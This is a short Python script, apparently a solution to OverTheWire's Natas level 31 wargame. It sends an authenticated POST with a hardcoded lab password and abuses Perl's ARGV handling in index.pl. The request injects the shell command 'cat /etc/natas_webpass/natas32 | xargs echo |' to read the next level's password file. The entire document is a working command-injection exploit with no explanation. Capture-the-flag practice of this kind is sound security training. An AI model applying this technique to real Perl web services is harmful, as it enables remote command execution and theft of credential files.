import requests
                                                             
url = 'http://natas31.natas.labs.overthewire.org/'

auth = ('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')

response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas32 | xargs echo |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)
print(response.text)